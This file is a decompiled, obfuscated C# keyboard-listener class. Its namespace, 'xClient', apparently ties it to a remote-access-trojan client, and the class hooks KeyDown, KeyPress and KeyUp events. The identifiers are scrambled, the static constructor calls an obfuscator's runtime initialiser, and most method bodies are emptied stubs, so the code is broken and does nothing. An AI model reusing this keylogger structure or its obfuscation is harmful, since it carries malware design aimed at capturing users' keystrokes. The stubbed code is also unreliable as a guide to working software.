using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;

namespace xClient.Core.MouseKeyHook.Implementation;

internal abstract class KeyListener : BaseListener, GInterface0
{
	[CompilerGenerated]
	private KeyEventHandler KeyDown;

	[CompilerGenerated]
	private KeyPressEventHandler KeyPress;

	[CompilerGenerated]
	private KeyEventHandler KeyUp;

	internal static KeyListener pNOTEwP9OxRR72dHNKw;

	public event KeyEventHandler Event_0
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event KeyPressEventHandler Event_1
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event KeyEventHandler Event_2
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	protected KeyListener(Delegate1 subscribe)
	{
	}

	public void InvokeKeyDown(GEventArgs0 e)
	{
	}

	public void InvokeKeyPress(GEventArgs1 e)
	{
	}

	public void InvokeKeyUp(GEventArgs0 e)
	{
	}

	protected override bool Callback(Struct1 data)
	{
		return true;
	}

	protected abstract IEnumerable<GEventArgs1> GetPressEventArgs(Struct1 data);

	protected abstract GEventArgs0 GetDownUpEventArgs(Struct1 data);

	static KeyListener()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		q7PZ9C1Yi5uM6UgDvKu();
	}

	internal static void htXNwl1t6hPZK9BwUCP()
	{
	}

	internal static bool D2ZveyPXxv7fdaoGqLp()
	{
		return true;
	}

	internal static KeyListener daL6mwPzLkVaCJjHcwB()
	{
		return null;
	}

	internal static object LUjBLx1xKrtag2lTMo3(object object_0, object object_1)
	{
		return null;
	}

	internal static object zURuUH1cVx7toCLTWPc(object object_0, object object_1)
	{
		return null;
	}

	internal static bool vMMGmh1HZ2REd8GrZuq(object object_0)
	{
		return true;
	}

	internal static bool SmvlTj1vaDjdGyPlPPo(object object_0)
	{
		return true;
	}

	internal static bool bJPY8Q1PubxcmXT9ImD(object object_0)
	{
		return true;
	}

	internal static bool ctiaEG11gsrjiRcl9KH(object object_0)
	{
		return true;
	}

	internal static void XuCMyu1p17CUVafcW9y(object object_0, object object_1, object object_2)
	{
	}

	internal static bool GNX68U1VBiPPwl007AL(object object_0)
	{
		return true;
	}

	internal static void cRAnsO1kb8mBgr3PO8D(object object_0)
	{
	}

	internal static void q7PZ9C1Yi5uM6UgDvKu()
	{
	}
}
